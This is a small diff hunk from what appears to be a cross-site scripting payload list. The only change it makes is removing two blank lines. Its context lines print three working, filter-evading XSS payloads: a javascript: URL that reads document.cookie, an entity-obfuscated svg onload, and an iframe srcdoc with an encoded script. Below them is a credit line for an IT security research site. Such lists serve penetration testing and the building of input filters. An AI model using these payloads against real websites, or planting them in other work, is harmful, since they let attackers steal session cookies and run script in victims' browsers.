@@ -37,7 +37,5 @@ javascript://%0a%0dalert(document.cookie)
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 
-
-
 "IT Security Development Research"
 https://1337syndicate.github.io/
